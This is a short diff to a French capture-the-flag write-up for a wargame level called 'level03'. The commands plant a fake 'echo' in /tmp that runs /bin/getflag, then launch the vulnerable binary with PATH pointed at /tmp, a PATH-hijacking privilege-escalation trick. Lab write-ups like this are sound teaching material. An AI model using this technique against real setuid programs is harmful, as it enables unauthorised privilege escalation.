@@ -13,6 +13,5 @@ ON peut ensuite faire un faux echo qui executera getflag, et Changer le PATH pou
 ```
 echo /bin/getflag > /tmp/echo
 chmod 777 /tmp/echo
-export PATH=/tmp
-./level03
+env -i PATH=/tmp ./level03
 ```
